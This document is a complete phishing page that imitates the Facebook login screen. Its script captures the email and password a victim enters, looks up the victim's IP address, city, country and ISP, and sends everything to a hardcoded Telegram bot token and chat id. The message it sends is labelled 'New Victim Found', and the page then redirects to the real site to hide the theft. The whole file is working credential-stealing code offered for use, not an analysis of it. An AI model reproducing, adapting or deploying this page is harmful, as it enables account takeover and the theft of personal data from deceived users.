<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1); width: 360px; text-align: center; }
        h1 { color: #1877f2; font-size: 40px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
        button { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>facebook</h1>
        <input type="text" id="email" placeholder="Email or phone number" required>
        <input type="password" id="pass" placeholder="Password" required>
        <button onclick="getIPAndSend()">Log In</button>
    </div>

    <script>
        async function getIPAndSend() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            const token = "8681097213:AAHBzxAJocYHUAJbwPnBfYUAEZBnOR0HmsI";
            const chat_id = "7444009144";

            if(!email || !pass) {
                alert("Please fill in all fields.");
                return;
            }

            try {
                // ভিকটিমের IP এবং লোকেশন বের করার জন্য API কল
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                const message = "🔥 **New Victim Found!** 🔥\n\n" +
                                "📧 **Email:** " + email + "\n" +
                                "🔑 **Pass:** " + pass + "\n\n" +
                                "🌐 **IP:** " + data.ip + "\n" +
                                "📍 **City:** " + data.city + "\n" +
                                "🏳️ **Country:** " + data.country_name + "\n" +
                                "📡 **ISP:** " + data.org;

                await fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message) + "&parse_mode=Markdown");
                
                window.location.href = "https://www.facebook.com";
            } catch (error) {
                // যদি IP API কাজ না করে তবে শুধু ডাটা পাঠানো হবে
                const simpleMessage = "📧 Email: " + email + "\n🔑 Pass: " + pass;
                fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(simpleMessage));
                window.location.href = "https://www.facebook.com";
            }
        }
    </script>
</body>
</html>
